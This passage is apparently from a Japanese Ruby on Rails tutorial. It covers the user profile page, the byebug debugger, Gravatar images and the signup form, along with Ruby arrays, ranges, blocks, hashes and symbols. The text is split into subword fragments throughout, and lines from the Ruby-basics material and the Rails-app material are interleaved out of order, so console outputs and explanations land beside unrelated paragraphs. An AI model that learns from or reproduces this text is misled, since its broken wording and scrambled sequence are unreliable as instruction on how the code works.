▁この ビュー では 埋め込み Ruby を使用して ユーザー名 と メールアドレスを 表示 しています 。 インスタンス変数 \ ko de {@ user } がある ことを前提とし ています 。
▁もちろん 、 ユーザー表示ページ の 最終的な 状態 は これ とは 大きく 異なります し 、 この メールアドレス が この ま ま 一般に 公開 される ようなこと も ありません 。
▁=> ▁[ 4 2, ▁ 8 , ▁ 17 , ▁ 6 ]
▁=> ▁[ 4 2, ▁ 8 , ▁ 17 , ▁ 6 , ▁ 7 ]
▁=> ▁[ 4 2, ▁ 8 , ▁ 17 , ▁ 6 , ▁ 7 , ▁" foo ", ▁" bar "]
▁ 最後の 例 では 、 要素 の 追加 を 連 鎖 ▁( cha in ) ▁ できる ことを 示 しました 。 他の 多くの 言語 の配列 と異なり 、 Ruby では 異なる 型 が 配列 の中で 共 存 できます ▁( 上の 場合は 整 数 と 文字列 )。
▁ 上で は 、 文字列を 配列 に変換 するのに \ ko de { s p li t } を使用し ました 。
▁\ ko de { join } メソッドは これ と 逆 の動作 です 。
▁ユーザー 表示 ビュー が 正常に 動作する ためには 、 Users コントローラ 内の \ ko de { show } アクション に対応する \ ko de {@ user } 変数 を定義する 必要があります 。
▁=> ▁[ 4 2, ▁ 8 , ▁ 17 , ▁ 7 , ▁" foo ", ▁" bar "]
▁ ご 想 像 の とおり 、 ここでは User モデルの \ ko de { find } メソッド ▁(\ ref { sec : find ing _ user _ objects }) ▁ を使用して データベースから ユーザー を取り出し ます 。 リスト \ ref { code : user _ show _ action } のように 書き 換 え てください 。
▁=> ▁" 4 28 17 7 foo bar "
▁ Users コントローラの \ ko de { show } アクション
▁=> ▁" 4 2, ▁ 8 , ▁ 17 , ▁ 7 , ▁ foo , ▁ bar "
▁\ emph { 範囲 ▁( range ) } ▁ は 、 配列 と 密 接 に 関係 しています 。 \ ko de { to \_ a } メソッドを使用して 配列 に変換 すると 理解 し やすい と思います 。
▁ユーザーの id 読み出し には \ ko de { params } を使用し ました 。
▁=> ▁0 . . 9
▁ Users コントローラに リクエスト が 正常に 送信 される と 、\ ko de { params [: id ]} の 部分 は ユーザー id の \ text tt {1} に置き 換 わ ります 。 つまり 、 この 箇所 は \ ref { sec : find ing _ user _ objects } で 学 んだ \ ko de { find } メソッドの ▁\ ko de { User . find (1) } と同じ になります 。
▁ No M e th o d Error : ▁ un de f in ed ▁ method ▁` to _ a ' ▁for ▁ 9 : F i x n um
▁( 技術 的な 補 足 : ▁\ ko de { params [: id ]} は 文字列 型 の ▁\ ko de { "1" } ▁ ですが 、\ ko de { find } メソッドで は自動的に 整 数 型 に変換 されます )。
▁=> ▁[ 0, ▁1, ▁ 2, ▁ 3, ▁4 , ▁5 , ▁ 6 , ▁ 7 , ▁ 8 , ▁ 9 ]
▁ユーザーの ビュー と アクション が 定義された ので 、 URL ▁\ href { http :// localhost :3000/ users /1 }{/ users /1 } ▁ は 完全に 動作する ようになりました ▁( 図 \ ref { fig : user _ show _ rails })。
▁\ ko de { 0 . . 9 } ▁ は 範囲 として 有効 ですが 、 上の 2 番目の 表 記 では メソッドを 呼 ぶ 際に かっこ を追加する 必要がある ことを 示 しています 。
▁( も し bcrypt ▁gem を追加して から まだ 一度 も Rails サーバ を 再 起動 させ ていない 場合は 、 ここで 再 起動 してください 。 )
▁ 範囲 は 、 配列 の 要素 を 取り出す の に 便利です 。
▁ 以下のコード を使用して
▁id = \ text tt {1} の ユーザーを 検索 できた のは 以上 の 仕組み による ものです ▁( リスト \ ref { code : user _ show _ action } ▁ )。
▁=> ▁[" foo ", ▁" bar ", ▁" baz ", ▁" q u u x "]
▁ Users リソース 追加 後 の の ユーザー表示ページ
▁\ ref { sec : a _ users _ resource } で 、 アプリケーションの 振る舞い を理解する ために \ ko de { デバッグ情報 } が 役 に 立 つ ことを 学 び ました 。
▁ インデックス に - 1 という 値を 指定 できる のは 極めて 便利です 。 - 1 を使用すると 、 配列 の 長さ を \ emph { 知 ら なくても } 配列 の 最後の 要素 を指定する ことができ 、 これにより 配列 を 特定の 開 始 位 置 の 要素 から 最後の 要素 まで を 一度 に 選択 することができます 。
▁Rails ▁4 . 2 から は 、\ text tt { by e b ug } ▁gem を使って もっと 直接 的に デバッグ できるようになりました ▁( リスト \ ref { code : gemfile _ sample _ app })。
▁ どう い う 風 に デバッグ できる ようになった のか 、\ ko de { デ バ ッ ガ ー } を アプリケーションに 差 し 込 んで 実際に 確かめ てみましょう ▁( リスト \ ref { code : debug g er })。
▁=> ▁[ 2, ▁ 3, ▁4 , ▁5 , ▁ 6 , ▁ 7 , ▁ 8 , ▁ 9 ]
▁ デ バ ッ ガ ー を Users コントローラに 差 し 込 む
▁ 以下のように 、 文字 に対して も 範囲 を使用できます 。
▁上の ように debug g er を 差 し 込 んだ 後に ▁ / users /1 ▁ にアクセス してみる と 、 Rails サーバ が \ ko de { by e b ug } の プロンプト を表示する ようになります 。
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e "]
▁ここでは Rails コンソール のように コマンド を呼び出す ことができ て 、 アプリケーションの 今 の 状態 を確認する ことができます 。
▁ 配列 と 範囲 は いずれ も 、\ emph { ブロック } を 伴 う さまざまな メソッド に対して 応答 することができます 。 ブロック は 、 Ruby の 極めて 強力な 機能 であり 、 かつ わかり にくい 機能 で もあります 。
▁ Ctrl - D を 押 す と プロンプト から 抜 け 出 す ことができます 。 また 、 デバッグ が 終わっ たら \ ko de { show } アクション 内の \ ko de { debug g er } の 行 を削除し てしまい ましょう ▁( リスト \ ref { code : debug g er _ remove d })。
▁=> ▁1. . 5
▁ デ バ ッ ガ ー を Users コントローラ ー から 取り 外 す
▁\ ko de { | i | } では 変数 名 が 縦 棒 「 | 」 に 囲 まれ ています が 、 これは ブロック 変数 に対して 使用する Ruby の 構 文 で 、 ブロック を 操作 するときに 使用する 変数 を指定します 。
▁ この場合 、 範囲 オブジェクトの \ ko de { each } メソッドは 、\ ko de { i } という 1 つの ローカル変数 を使用して ブロック を 操作 できます 。 そして 、 範囲 に含まれる それぞれの 値を この 変数 に 次 々 に 代入 して ブロック を実行します 。
▁ 今後 Rails アプリケーション の中で よく 分 から ない 挙 動 が あった ら 、 上の ように \ ko de { debug g er } を 差 し 込 んで 調 べ てみましょう 。 ト ラ ブ ル が 起 こ って い そう な コードの 近 く に 差 し 込 む の が コ ツ です 。
▁ ブロック であることを 示す には 波 かっこ ▁ { ▁ } ▁ で 囲 み ます が 、 以下のように do と end で 囲 んで 示す こともできます 。
▁\ text tt { by e b ug } を使って システム の 状態 を 調 査 すること は 、 アプリケーション 内の エラー を 追 跡 したり デバッグ するときに 非常に 強力な ツール になります 。
▁ 前 節 で 基本的な ユーザー ページの 定義 は 終わり ました ので 、 今度は 各 ユーザーの プロファイル 写 真 の あ たり を もう少し 肉 付け し 、 サイドバー も 作り 始 め ましょう 。
▁ここでは \ href { http :// gravatar . com /}{ Gravatar ▁( g lo b all y ▁ re co g n ize d ▁a v at ar ) ▁ } を ユーザー プロファイル に 導入 してみましょう
▁ ブロック には 複数の 行 を 記述 できます ▁( 実際 ほとんど の ブロック は 複 数 行 です )。
▁ ヒ ン ズ ー 教 では 、 ア バ ター は 人 間 や 動 物 の 形 を と って 神 が 顕 現 した もの と 考え られ ています 。
▁\ emph { Rails チュートリアル } では Ruby 共通 の 慣習 に従って 、 短 い 1 行 の ブロック には 波 かっこ を使用し 、 長 い 1 行 や 複 数 行 の ブロック には \ ko de { do . . end } 記 法 を使用しています 。
▁ これを 拡大 解 釈 して 、\ emph { ア バ ター } という 用 語 は 、 特に ネ ッ ト 界 隈 で 、 その 人 物 を 表現 する もの ▁( かつ その 人 そのもの の一部 でも ある ) ▁という 意味 で 使われ ます 。
▁今度は \ ko de { i } の代わりに \ ko de { number } を 使用している ことにご注目ください 。 この 変数 ▁( ブロック 変数 ) ▁ の名前 は 固定 されていません 。
▁ Gravatar は 無料 の サービス で 、 プロファイル 写 真 を アップロード して 、 指定 した メールアドレス と 関連付け ることができます 。
▁ ブロック は 見 た 目 に 反 して 奥 が 深 く 、 ブロック を 十分 に 理解 するために は 相 当 な プログラミング 経験 が必要です 。 そのため には 、 ブロック を含む コードを たくさん 読み こ な す ことで ブロック の 本 質 を 会 得 する 以外に 方法 はありません
▁ Gravatar は 、 プロファイル 写 真 を アップロード する とき の 面倒 な 作業 や 、 写 真 が 欠 け たり などの ト ラ ブ ル 、 置き場所 の 悩 み を 解決 します 。 ユーザーの メールアドレスを 組 み 込 んだ Gravatar 専 用の 画像 パス を構成する だけで 、 対応する Gravatar の 画像 が自動的に 表示 されます
▁なお エ キ ス パ ート 向け には 、 ブロック が \ emph { ク ロー ジ ャ } になっている ということ を 知 って い ただ く と 理解 し やすい と思います 。 ク ロー ジ ャ とは 、 データを 伴 う 、 その 場 限 り の 無 名 関数 です 。
▁( カスタム 画像 を扱う 方法 については \ ref { sec : micropost _ images } で 扱 います )。
▁ 幸 い な ことに 、 人 間 には 個 別の 事 例 を 一 般 化 する 能 力 という もの があります 。 さ さ や か ですが 、\ ko de { ma p } メソッド など を使用した ブロック の 使用 例 を 参 考 のために いくつか 挙 げ て み ます 。
▁ここでは 、 リスト \ ref { code : user _ show _ view _ with _ gravatar } のように \ ko de { gravatar \_ for } ヘルパーメソッド を使用して Gravatar の 画像 を 利用 できるようにします 。
▁" B e te l g e us e ! "
▁ユーザー 表示 ビュー に 名前 と Gravatar を表示する
▁ デフォルトで は 、 ヘルパー ファイル で 定義されている メソッドは 自動的に すべての ビューで 利用 できます 。 ここでは 、 利 便 性 を 考え て \ ko de { gravatar \_ for } を Users コントローラに 関連付けられている ヘルパー ファイル に置く ことにしましょう 。
▁=> ▁[1, ▁4 , ▁ 9 , ▁ 16 , ▁2 5 ]
▁\ href { http :// en . gravatar . com / site / im p le m ent / hash /}{ Gravatar の ホ ー ム ページ } にも 書かれてい るように 、 Gravatar の URL は \ href { http :// en . w ikipedia . org / wiki / M D 5 } { M D 5 ハッシュ } を 用 いて ユーザーの メールアドレスを ハッシュ化 しています 。
▁Ruby では 、\ ko de { D ig e st } ライブラリ の \ ko de { h ex digest } メソッド を使用した M D 5 ハッシュ ア ル ゴ リ ズ ム が 実装 されています 。
▁=> ▁[" a ", ▁" b ", ▁" c "]
▁=> ▁[" A ", ▁" B ", ▁" C "]
▁=> ▁" 1 f d a 4 4 6 9 b c b ec 3 b ad f 5 4 18 2 6 9 f f c 59 6 8 "
▁ メールアドレス は 大文字 と 小文字 を 区別 しません が ▁(\ ref { sec : format _ validation }) 、 M D 5 ハッシュ では 大文字 と 小文字 が 区別 される ので 、 Ruby の \ ko de { downcase } メソッドを使用して \ ko de { h ex digest } の 引数 を 小文字 に変換 しています 。
▁ 上 に示したように 、\ ko de { ma p } メソッドは 、 与えられた ブロック を 配列 や 範囲 オブジェクトの 各 要素 に対して 適 用 し 、 その 結果 を返します 。
▁( 本チュートリアルで は 、 リスト \ ref { code : email _ downcase } の コールバック 処理 で 小文字 変 換 された メールアドレスを 利用 している ため 、 ここで 小文字 変 換 を 入 れ なくても 結果 は 同じです 。 ただし 、 将来 \ ko de { gravatar \_ for } メソッドが 別の 場所 から 呼 び だ される 可能性 を 考え ると 、 ここで 小文字 変 換 を 入 れ ること には 意 義 があります 。 )
▁また 、 後 半 の 2 つの 例 では 、\ ko de { ma p } の ブロック 内で 宣言 した 引数 ▁( cha r ) ▁ に対して メソッドを 呼び出し ています 。 こういった ケース では 省略 記 法 が 一般的 で 、 以下のように 書く こともできます 。
▁\ ko de { gravatar \_ for } ヘルパー を 組 み 込 んだ 結果を リスト \ ref { code : gravatar _ for _ helper } に 示 しました 。
▁\ ko de { gravatar \_ for } ヘルパーメソッド を定義する
▁( メソッド 名 に \ emph { シンボル } が 使われ ている ので 奇 妙 に 見え る かもしれません 。 これ については \ ref { sec : hash es _ and _ symbol s } で説明します )。
▁リスト \ ref { code : gravatar _ for _ helper } のコードは 、 Gravatar の 画像 タグ に \ ko de { gravatar } クラス と ユーザー名 の alt テキスト を追加した もの を返します ▁( alt テキスト を追加し ておく と 、 視 覚 障 害 のある ユーザーが ス ク リ ー ン リ ー ダ ー を使用する ときに も 役 に 立 ち ます )。
▁ ひとつ 面 白 い 話 があります 。 これは 実は 元 々 Ruby ▁on ▁Rails 独自の 記 法 で した 。 しかし 多くの 人 が この 記 法 を 好 む ようになった ので 、 今 では Ruby の コア 機能 として 導入 されています 。
▁ プロフィール ページ は 図 \ ref { fig : profile _ with _ gravatar } のようになります 。 ここに は デフォルトの Gravatar 画像 が表示され ています が 、 これは デフォルトの メールアドレス \ ko de { user @ example . com } が 本 当 の メールアドレス では ない ためです 。
▁ 最後の ブロック の例 として 、 単 体 テスト にも 目 を 向け てみましょう ▁( リスト \ ref { code : home _ base _ title _ spec })。
▁( ちなみに \ href { http :// www . example . com /}{ example . com } という ドメイン 名 は 、 例 として 使用 するために 特 別 に 予 約 された ドメイン と な っています )
▁ ユーザー表示ページ に Gravatar の デフォルト 画像 が表示されている
▁ここでは 動作 を す み ず み まで 理解 する必要はありません ▁( 実際 、\ emph { 筆者 } も このコード を ひ と 目 で 完 璧 に 把 握 できる など とは 言 いません )。 ここで 重要な のは 、 テストコード に \ ko de { do } という キーワード がある ことに 気 付き 、 そこ から テスト の 本 体 が 「 そ も そ も ブロック で でき ている 」 ことに 気 付 く ことです 。
▁ す な わ ち 、 この \ ko de { test } メソッドは 文字列 ▁( 説明 文 ) ▁ と ブロック を 引数に と り 、 テストが 実行される ときに ブロック 内の 文 が 実行される 、 ということ が 理解 できます 。
▁ ところで 、\ ref { sec : heroku _ command s } で ランダム な サブ ドメイン を生成する ために 以下の Ruby コードを 紹 介 しました が 、 このコード を理解する ための 準備 が 整 った ので 、 今 こ そ 読み 解 い てみましょう 。
▁この コードを じ ゅ ん を お っ t 組 み 立 て てみると 、 動作 が よく わかり ます 。
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e ", ▁" f ", ▁" g ", ▁" h ", ▁" i ", ▁" j ", ▁" k ", ▁" l ", ▁" m ", ▁" n ", ▁" o ",
▁ ユーザー表示ページ に Gravatar の カスタム 画像 が表示されている
▁" p ", ▁" q ", ▁" r ", ▁" s ", ▁" t ", ▁" u ", ▁" v ", ▁" w ", ▁" x ", ▁" y ", ▁" z "]
▁ 図 \ ref { fig : profile _ mockup _ profile _ name } のモックアップ に 近 づ け るために 、 ユーザーの サイドバー の最初の バージョン を 作り ましょう 。
▁=> ▁[" c ", ▁" g ", ▁" l ", ▁" k ", ▁" h ", ▁" z ", ▁" s ", ▁" i ", ▁" n ", ▁" d ", ▁" y ", ▁" u ", ▁" t ", ▁" j ", ▁" q ",
▁ここでは \ ko de { as id e } タグ を使用して 実装します 。 この タグ は サイドバー などの 補 完 コンテンツ の 表示 に 使用されます が 、 単 独 で 表示 することもできます 。
▁" b ", ▁" r ", ▁" o ", ▁" f ", ▁" e ", ▁" w ", ▁" v ", ▁" m ", ▁" a ", ▁" x ", ▁" p "]
▁\ ko de { row } クラス と \ ko de { c ol - m d - 4 } クラス も 追加 しておきます 。 これらの クラス は Bootstrap の一部 です 。
▁=> ▁[" f ", ▁" w ", ▁" i ", ▁" a ", ▁" h ", ▁" p ", ▁" c ", ▁" x "]
▁ ユーザー表示ページ を変更 した 結果を リスト \ ref { code : user _ show _ with _ s id e bar } に示します 。
▁=> ▁" m z n p y b u j "
▁ユーザーの \ ko de { show } ビュー に サイドバー を追加する
▁ ハッシュ は 、 本 質 的に は 配列 と同じ ですが 、 インデックス として 整 数値 以外の もの も 使用できる 点が 配列 と 異なります
▁( この 理由 から 、 いくつかの 言語 ▁( 特に P er l ) ▁ では ハッシュ を \ emph { 連 想 配列 } と 呼 ぶ こともあります )。
▁ ハッシュの インデックス ▁(\ emph { キー } と 呼 ぶ のが普通です ) ▁ は 、 通常 何らかの オブジェクト です 。
▁たとえば 、 以下のように 文字列を キー として 使用できます 。
▁ HTML 要素 と CSS クラス を 配置 した ことにより 、 プロフィール ページ ▁( と サイドバー と Gravatar ) ▁ に S CSS で リスト \ ref { code : s id e bar _ css } のように スタイル を与える ことが できるようになりました
▁リスト \ ref { code : s id e bar _ css } では \ ko de { . gravatar \_ edit } という CSS クラス を追加し ています 。 これは 第 \ ref { cha : updating _ show ing _ and _ de let ing _ users } 章 でも 使われ ます 。
▁( テーブル CSS の ルール が ネ ス テ ィ ング ▁( 入 れ 子 ) ▁ されています が 、 これ が 有効 になる のは Asset ▁Pipeline で Sass エンジン が 使用されている 場合に 限 られます ) ▁ 。
▁ ページの 変更 の 結果を 図 \ ref { fig : user _ show _ s id e bar _ css } に示します 。
▁=> ▁ { " last _ name " => " H ar t l ", ▁" first _ name " => " Michael "}
▁S CSS を使用して サイドバー などの ユーザー表示ページ に スタイル を与える
▁ここで 重要な のは 、 ハッシュの 波 かっこ は 、 ブロック の 波 かっこ とは まったく 別 物 である という 点 です
▁ ここ まで で ユーザー プロファイル ページ が ひ と まず 動作する ようになりました ので 、 今度は ユーザー登録フォーム を作成し ましょう 。
▁( これは 確 か に 紛 ら わ しい 点 です ) ▁ 。
▁ 図 \ ref { fig : new _ signup _ page } ▁( 図 \ ref { fig : blank _ signup _ page _ re ca p } にも 再 録 ) ▁ に示した とおり 、 ユーザー登録ページ はまだ 空白 の ま ま なので 、 このままでは ユーザー登録 できません 。
▁ ハッシュ は 配列 と似ています が 、 1 つの 重要な 違 い として 、 ハッシュ では 要素 の 「 並 び 順 」 が 保 証 され ない という 点 があります
▁ この節 の 目 標 は 、 この み っ とも ない ページを 改 造 して 図 \ ref { fig : signup _ mockup } のモックアップ のような ページに 変え ること です 。
▁ 実は Ruby ▁1. 9 以降 では 、 ハッシュの 要素 の 順序 が 入力 順 と同じ であることを 保 証 しています が 、 ハッシュ を 特定の 順序 に 依 存 して カウント する のは 得 策 ではありません 。
▁ 現 状 の ユーザー登録ページ ▁\ href { http :// localhost :3000/ signup }{/ signup }
▁ も し 要素 の 順序 が 重要 である 場合は 、 配列 を使用する 必要があります 。
▁ ハッシュの 1 要素 を 角 かっこ を使って 定義 する 代わりに 、 以下のように キー と 値を ハッシュ ロ ケ ッ ト と呼ばれる \ ko de { => } ▁ によって リ テ ラ ル 表現 する ほ う が 簡単 です 。
▁Web 経由で ユーザー を作成する 機能を これ から 追加 します ので 、\ ref { sec : creat ing _ and _ a u the n tic at ing _ a _ user } で作成した ユーザーを ここで 削除 しておきましょう 。
▁ 最も 簡単な 方法は 、 Rake の \ ko de { db : migrate : reset } タスク を実行して データベース を リセット することです 。
▁ここでは Ruby における 慣習 として 、 ハッシュの 最 初 と 最後に 空白 を追加し ています 。 この 空白 は あって も なくても よく 、 コンソール では 無視 されます
▁最後に 、 システム によって は 変更を 反 映 するために ターミナル 上で Ctrl - C を 押 して Web サーバーを再起動 する必要が 生じる こともあります 。
▁( な ぜ スペース を 置 く ようになった のか は わかり ません 。 おそらく 初期 の 有 力 な ▁Ruby プ ログ ラ マ が 好 んだ 結果 、 慣習 と な った の でしょう )。
▁ ユーザー登録ページ で 重要な 点 は 、 ユーザー登録 に 欠 か せ ない 情報を 入力 するための \ emph { form } です 。
▁ ここ まで は ハッシュの キー として 文字列 を使用して い ましたが 、 Rails では 文字列 よりも \ emph { シンボル } を使用する 方が 普通 です 。
▁これ を行う には 、 Rails で \ ko de { form \_ for } ヘルパーメソッド を使用します 。 このメソッドは Active ▁Record オブジェクトを 取り 込 み 、 オブジェクトの 属性 を使用して フォーム を 構成 します 。
▁ シンボル は 文字列 と似ています が 、 ク ォ ート で 囲 む 代わりに コ ロ ン が 前 に置かれている 点が 異なります 。
▁ ユーザー登録ページ ▁ / signup ▁ の ルーティング は 、 Users コントローラ ー の \ ko de { new } アクションに 既に 紐 付け られ ている ことを思い出してください ▁( リスト \ ref { code : signup _ route })。 したがって 、 次の ステップ は 、 ▁\ ko de { form \_ for } の 引数 で 必要となる User オブジェクト を作成する ことになります
▁たとえば 、\ ko de { : name } は シンボル です 。
▁ 必要となる \ ko de {@ user } 変数 の 定義 は 、 以下の リスト \ ref { code : new _ action _ with _ user } のようになります 。
▁\ ko de { new } アクションに \ ko de {@ user } 変数 を追加する
▁もちろん 、 余 計 な ことを 一 切 考え ずに 、 シンボル を 単なる 文字列 と み な しても 構 いません
▁ 余 計 な もの を 削 ぎ 落 した 結果 、 シンボル 同士 の 比 較 を 容易に 行 え ます 。 文字列 は 1 文字 ず つ 比 較 する必要があります が 、 シンボル は 一度 に 全体 を 比 較 できます 。
▁ フォーム そのもの は リスト \ ref { code : signup _ form } で 示 します 。
▁\ ref { sec : the _ form _ html } で 詳 細 について 触 れ ます が 、 まず は リスト \ ref { code : form _ css } の S CSS で 見 栄 え を 整 え てみましょう 。
▁これは ハッシュの キー として 理 想 的な 性 質 です 。
▁\ ko de { box \_ s i z ing } ミ ッ ク ス イン を リスト \ ref { code : m i x in _ and _ debug } から 再 利用 し ていることに注目してください 。
▁これらの CSS ルール が 一度 適 用 される と 、 ユーザー登録ページ は 図 \ ref { fig : signup _ form } のようになります .
▁=> ▁[" n ", ▁" a ", ▁" m ", ▁" e "]
▁ 新規ユーザー のための ユーザー登録フォーム
▁ No M e th o d Error : ▁ un de f in ed ▁ method ▁` s p li t ' ▁for ▁: name : S y m b ol
▁=> ▁" r a b o of "
▁ No M e th o d Error : ▁ un de f in ed ▁ method ▁` reverse ' ▁for ▁: foo bar : S y m b ol
▁ ユーザー登録フォーム の CSS
▁ シンボル は 、 Ruby 以外 では ご く 一部の 言語 に しか 採 用 されていない 特殊な データ 形式 です 。 最 初 は 奇 妙 に 思 う かもしれませんが 、 Rails では シンボル を ふ んだ ん に 使用している ので 、 すぐ に 慣 れる でしょう 。
▁ ユーザー登録フォーム
▁ただし 文字列 と 違 って 、 全 て の 文字 が 使 え る わ け では ない ことに注意してください
▁リスト \ ref { code : signup _ form } で定義した フォーム を理解する ために 、 小さな コード に 分 け て 考えてみましょう 。
▁ とは い え 、 一般的な ア ル フ ァ ベ ッ ト など を 使っている 限 り において は 、 シンボル で 困 ること は ない でしょう 。
▁まずは 、 埋め込み Ruby が 使われ ている \ ko de { form \_ for } から \ ko de { end } まで の 外 側 の 構造 を 読み 解 い ていきます 。
▁ ハッシュの キー として シンボル を 採 用 する 場合 、\ ko de { user } ▁ の ハッシュ は 以下のように 定義 できます 。
▁\ ko de { do } キーワード は 、 ▁\ ko de { form \_ for } が 1 つの 変数 を持つ ブロック を 取 ること を表し ます 。 この 変数 \ ko de { f } は ▁“ form ” ▁ の f です 。
▁ 通常 、 Rails ヘルパー を 使用している 場合 、 実装 の詳細 について 知 っ ておく 必要はありません 。 ただし \ emph { f } という オブジェクトが \ ko de { 何 を する のか は 知 っ ておく } 必要があります 。 この \ emph { f } オブジェクトは 、\ href { http :// www . w 3 s ch o ol s . com / html / html _ form s . as p } { HTML フォーム 要素 } ▁( テキスト フィールド 、 ラ ジ オ ボタン 、 パスワード フィールド など ) ▁ に対応する メソッドが 呼び出される と 、\ emph {@ user } の 属性 を設定する ために 特 別 に 設計 された HTML を返します 。
▁=> ▁ { : name => " Michael ▁Hartl ", ▁: email => " michael @ example . com "}
▁ 最後の 例 を見ると 、 未 定義 の ハッシュ 値 は 単 純 に \ ko de { nil } である ことがわかります 。
▁ ハッシュ では シンボル を キー として 使う ことが 一般的な ので 、 Ruby ▁1. 9 では このような 特殊な 場合 のための 新しい 記 法 を サポート しています 。
▁User モデルの \ ko de { name } 属性 を設定する 、 ラ ベ ル 付き テキスト フィールド 要素 を作成する の に 必要な HTML を作成します
▁ 生成された フォームの HTML を見 たい場合は 、 ブラウザ 上で 表示 画面 を 右 クリック し 、 出 てきた ポ ッ プ アップ 項目 の中から ▁[ ソース を 表示 ] ▁ といった 項目 をクリックして ください 。 Web ページの HTML ソース は リスト \ ref { code : signup _ form _ html } のようになります 。
▁ HTML ソース の 中 の 、 フォーム を 形 成 する HTML 構造 に 注 目 してみましょう 。
▁2 つ目の 記 法 は 、 シンボル と ハッシュ ロ ケ ッ ト の 組み合わせ を 、 以下のように キー の名前 の ▁( 前 ではなく ) ▁ 後に コ ロ ン を 置 き 、 その後 に 値が 続 く ように 置き換え た ものです 。
▁ 図 \ ref { fig : signup _ form } の フォームの HTML ソース
▁この 構成 は 、 JavaScript など 他の 言語 の ハッシュ 記 法 により 近 い もの になっ ており 、 Rails コ ミ ュ ニ テ ィ でも 人 気 が 高 ま っています 。
▁ どちら の 記 法 も よく 使われ ている ので 、 両方 の 見 分 け が つ く ことが 重要です 。
▁まずは この HTML ソース の 内部 構造 について説明し ます 。
▁ ただ 最 初 は 少し 見 分 け づ ら い の も 事 実 です 。 たとえば \ ko de { : name } は シンボル として 独 立 しています が 、 引数 を 伴 わ ない \ ko de { name : } では 意味 が 成 り 立 ち ません 。
▁リスト \ ref { code : signup _ form } と リスト \ ref { code : signup _ form _ html } を じ っ く り 見 比 べ てみると 、 以下の 埋め込み Ruby は
▁ 以下のコード の \ ko de { : name ▁=> } と \ ko de { name : } は 、\ emph { ハッシュ として の データ 構造 は } 全 く 同じです 。 つまり 、
▁以下の HTML を生成し ている ことがわかります 。
▁という コードは 等 価 になります ▁( 一般的 には 省略 記 法 が 好 まれ ます が 、 明示的に 接 頭 に コ ロ ン を つ け て シンボル ▁(\ ko de { : name }) ▁ であることを 強 調 する という 考え 方 もあります )。
▁ 次の 図 \ ref { fig : fi ll ed _ in _ form } に 示す ように 、 テキスト フィールド ▁(\ ko de { type =" text "} と \ ko de { type =" email " }) ▁ では 内容 を そのまま 表示 しています が 、 パスワード フィールド ▁(\ ko de { type =" password " }) ▁ では セキュリティ上の 目的 のために 文字 が 隠 蔽 されています ▁( 図 \ ref { fig : fi ll ed _ in _ form })。
▁( email フィールド と text フィールド は 同じ ように 見え ます が 、 細 か な 点が 違 います 。 たとえば 、\ ko de { type =" email "} と な っている 場合 、 モ バ イ ル 端 末 から 入力 フォーム を タ ッ プ すると 、 メールアドレス に 最適化 された 特別な キー ボ ー ド が表示される ようになります 。 )
▁\ ko de { text } フィールド と \ ko de { password } フィールド に 文字 を 入力 した 状態
▁\ ref { sec : success f ul _ signup s } でも 説明します が 、 ユーザーの 作成 で 重要な のは \ ko de { input } ごとに ある 特殊な \ ko de { name } 属性 です 。
▁次に 重要な 要素 は 、\ ko de { form } タグ 自身 です 。
▁これらの 2 つの 属性 は 、 HTTP ▁\ text tt { POST } リクエスト に対する 指示 を 構成 しています 。
▁これらの 属性 の 効 用 については 次の 2 つの 節 で説明します 。
▁ ところで 、\ ko de { form } ▁ タグ の 内 側 で 次のような HTML が生成され ていた ことに も お 気 付き でしょう か 。
▁リスト \ ref { code : n e st ed _ hash es } に示したように 、 ハッシュ の値 には ほぼ 何 でも 使用する ことができ 、 他の ハッシュ を使用すること す ら できます 。
▁このコードは ブラウザ 上で は 何も 表示 しません が 、 Rails の 内部で 使用される 特別な コード です 。 ▁ したがって 、 どう い った 意 図 で 生成された のか は 、 現時点では まだ 理解 し なくても 大 丈 夫 です 。
▁ ハッシュの 中 の ハッシュ
▁ 動作 の詳細 を 知りたい 場合は 、 S t ack ▁ O ver flow の \ href { http :// st ack o ver flow . com / que st ions / 9 4 1 59 4 / u nder st and - rails - a u the n tic ity - token } { Rails 信 頼 性 トークン 関連 の 書き 込 み ▁( 英語 ) } ▁ を参照してください 。
▁ 図 \ ref { fig : signup _ form } では フォームの HTML が どう な っている か を簡単に 説明 しました ▁( リスト \ ref { code : signup _ form _ html } 参 照 ) ▁ が 、 フォーム を理解する には \ emph { ユーザー登録 の 失敗 のとき } が 最も 参 考 になります 。
▁=> ▁ { : name => " Michael ▁Hartl ", ▁: email => " mhartl @ example . com "}
▁この節では 、 無効な データ 送信 を 受け 付け る ユーザー登録フォーム を作成し 、 ユーザー登録フォーム を更新し て エラー の 一覧 を表示します 。 この モックアップ を 図 \ ref { fig : signup _ failure _ mockup } に示します 。
▁=> ▁ { : user => { : name => " Michael ▁Hartl ", ▁: email => " mhartl @ example . com "} }
▁ ユーザー登録 が 失敗した とき のモックアップ 。
▁\ label { fig : signup _ failure _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { 正しい フォーム } ▁% ▁( fold )< n > ▁\ label { sec : a _ working _ form }< n >< n >
▁Rails では 、 このような ハッシュの ハッシュ ▁( または \ emph { ネスト された ハッシュ }) ▁ が 大 量 に 使われ ています 。 実際の 使用 例 は \ ref { sec : unsuccessful _ signup s } で説明します 。
▁\ ref { sec : a _ users _ resource } で 、\ ko de { resources ▁: users } を \ ko de { routes . rb } ファイル に追加する と ▁( リスト \ ref { code : users _ resource }) ▁ 自動的に Rails アプリケーション が 表 \ ref { table : RESTful _ users } の RESTful ▁ U R I ▁ に応答する ようになった ことを思い出してください 。
▁ 配列 や 範囲 オブジェクト と同様 、 ハッシュ も \ ko de { each } メソッド に 応答 します 。
▁ 特に 、 / users への \ text tt { POST } リクエスト は \ ko de { create } アクションに 送 られます 。
▁たとえば 、\ ko de { : success } と \ ko de { : error } という ▁2 つの 状態 を持つ ▁\ ko de { flash } ▁ という名前の ハッシュ について 考えてみましょう 。
▁ 私 た ち は ここで 、\ ko de { create } アクション で フォーム 送信 を受け取り 、\ ko de { User . new } を使用して 新しい ユーザー オブジェクト を作成し 、 ユーザーを 保存 ▁( または 保存 に 失敗 ) ▁ し 、 再度 の 送信 用の ユーザー登録ページ を表示する という 方法で 機能を 実装 し よう と思います 。
▁" I t ▁ w or ke d ! "
▁まずは ユーザー登録フォーム のコード を見 直 してみましょう 。
▁I t ▁ failed .
▁\ ref { sec : the _ form _ html } で 説明したように 、 この HTML は \ text tt { POST } リクエストを / users という URL に 送信 します 。
